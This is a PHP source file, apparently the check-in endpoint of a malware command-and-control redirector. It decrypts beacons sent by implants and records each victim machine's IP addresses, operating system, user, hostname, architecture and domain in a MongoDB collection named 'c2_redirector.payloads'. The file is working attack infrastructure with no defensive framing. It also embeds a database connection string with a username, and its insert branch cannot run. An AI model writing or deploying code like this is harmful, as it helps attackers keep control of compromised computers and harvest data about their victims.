<?php
// register_fixed.php - Using MongoDB driver directly
header('Content-Type: application/json');

try {
    include_once __DIR__ . '/AES.php';
} catch (Exception $e) {
    http_response_code(500);
    die(json_encode(['error' => $e->getMessage()]));
}

// Check if MongoDB driver is available
if (!class_exists('MongoDB\Driver\Manager')) {
    http_response_code(500);
    echo json_encode(["error" => "MongoDB Driver not available"]);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['uuid'])) {
    http_response_code(400);
    echo json_encode(["error" => "UUID is required"]);
    exit;
}

try {
    // Use MongoDB driver directly (low-level)
    $manager = new MongoDB\Driver\Manager("mongodb+srv://s12deff_db_user:...@cluster0.btqpvis.mongodb.net/?appName=Cluster0");
    
    $uuid = $input['uuid'];
    $encrypted = $input['encrypted_data'] ?? '';
    $now = new MongoDB\BSON\UTCDateTime();
    
    // Check if payload exists
    $filter = ['uuid' => $uuid];
    $query = new MongoDB\Driver\Query($filter);
    $existing = $manager->executeQuery('c2_redirector.payloads', $query)->toArray();

    if (empty($existing)) {
        http_response_code(404);
        echo json_encode(["error" => "Payload not found"]);
        exit;
    }

    $decryption_key = $existing[0]->decryption_key ?? '';
    $decryption_key = base64_decode($decryption_key);
    $decryption = new AES256Decryptor($decryption_key);
    $decrypted_json = $decryption->decrypt($encrypted);

    error_log("Decrypted JSON (raw): " . $decrypted_json);
    
    // convertir a array
    $decrypted_data = json_decode($decrypted_json, true);
    
    if (!is_array($decrypted_data)) {
        http_response_code(400);
        echo json_encode(["error" => "Decrypted data is not valid JSON"]);
        exit;
    }
    
    error_log("Decrypted data (array): " . json_encode($decrypted_data));
    
    $document = [
        'uuid' => $uuid,
        'ips' => $decrypted_data['ips'] ?? [],
        'os' => $decrypted_data['os'] ?? '',
        'user' => $decrypted_data['user'] ?? '',
        'host' => $decrypted_data['host'] ?? '',
        'architecture' => $decrypted_data['architecture'] ?? '',
        'domain' => $decrypted_data['domain'] ?? '',
        'last_seen' => $now,
        'status' => 'active'
    ];
    
    error_log("Document: " . json_encode($document));
    
    
    if (!empty($existing)) {
        // Update existing
        $bulk = new MongoDB\Driver\BulkWrite;
        $bulk->update($filter, ['$set' => $document]);
        $manager->executeBulkWrite('c2_redirector.payloads', $bulk);
        
        echo json_encode(["message" => "Payload updated", "action" => "updated"]);
    } else {
        // Insert new
        $document['first_seen'] = $now;
        $document['created_at'] = $now;
        
        $bulk = new MongoDB\Driver\BulkWrite;
        $bulk->insert($document);
        $result = $manager->executeBulkWrite('c2_redirector.payloads', $bulk);
        
        echo json_encode([
            "message" => "Payload registered", 
            "action" => "created"
        ]);
    }
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(["error" => "MongoDB error: " . $e->getMessage()]);
}
?>